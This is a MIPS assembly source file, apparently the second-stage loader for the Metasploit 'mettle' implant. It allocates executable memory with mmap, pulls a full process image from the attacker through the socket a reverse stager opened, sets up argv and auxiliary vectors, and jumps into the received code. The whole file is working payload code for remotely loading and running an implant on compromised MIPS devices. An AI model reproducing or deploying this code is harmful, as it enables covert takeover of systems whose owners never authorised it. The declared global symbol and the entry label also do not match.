.global __start

# Required symbols:
#   SIZE: size of the final payload
#   ENTRY: entry point offset from the start of the process image

.text
___start:
  # mmap the space for the mettle image
  move $a0, $zero  # address doesn't matter
  li   $a1, SIZE   # more than 16-bits
  li   $a2, 7      # PROT_READ | PROT_WRITE | PROT_EXECUTE
  li   $a3, 0x802  # MAP_PRIVATE | MAP_ANONYMOUS

  sw  $0, 16($sp)  # Dumb O32 ABI
  sw  $0, 20($sp)

  li  $v0, 4090    # syscall: mmap
  syscall

  # recv the process image
  # s2 contains our socket from the reverse stager
  move $a2, $a1    # recv the whole thing (I, too, like to live dangerously)
  move $a1, $v0    # move the mmap to the recv buffer
  move $a0, $s2    # set the fd
  li   $a3, 0x100  # MSG_WAITALL

  li   $v0, 4175   # syscall: recv
  syscall

  # set up the initial stack
  # The final stack must be aligned, so we align and then make room backwards
  # by _adding_ to sp.
  and  $sp, $sp, -8    # Align
  li   $t4, 0x6d00006d # BE/LE anagram of "m" (109, 0)
  sw   $t4, 44($sp)    # On the stack

  # Initial program stack:
  li   $t5, 2          # ARGC
  sw   $t5,  0($sp)
  addi $t6, $sp, 44    # ARGV[0] char *prog_name
  sw   $t6,  4($sp)
  sw   $s2,  8($sp)    # ARGV[1] int socket fd
  sw   $0,  12($sp)    # (NULL)
  sw   $0,  16($sp)    # (NULL) (Ending ENV)
  li   $t7, 7          # AT_BASE
  sw   $t7, 20($sp)
  sw   $a1, 24($sp)    # mmap'd address
  li   $t8, 6          # AT_PAGESZ
  sw   $t8, 28($sp)
  li   $t9, 0x1000     # 4k
  sw   $t9, 32($sp)
  sw   $0,  36($sp)    # AT_NULL
  sw   $0,  40($sp)

  # hack the planet
  li  $s0, ENTRY
  add $s0, $s0, $a1
  jr  $s0
